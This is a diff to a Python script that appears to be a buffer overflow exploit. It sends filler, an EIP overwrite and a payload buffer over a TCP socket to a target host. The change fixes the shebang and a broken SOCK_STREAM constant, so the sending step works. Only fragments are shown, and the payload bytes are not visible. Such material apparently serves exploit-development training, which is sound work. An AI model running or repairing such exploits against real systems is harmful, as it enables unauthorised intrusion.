@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 # Socket: Needed to send data to the port socket of the target host.
 # Sys: Needed to exit the python program if we are unable to connect to the target host.
 import socket, sys
@@ -20,7 +20,7 @@ try:
   print ("\nSending Payload")
     
   # Initialize and send input_buffer variable fuzzing data through the socket to the target host.
-  s = socket.socket (socket.AF_INET, socket.sock_STREAM)
+  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
   s.connect((target_IP, target_port))
   s.send(filler_to_EIP + EIP + EIP_to_ESP + new_buffer)
   s.close()
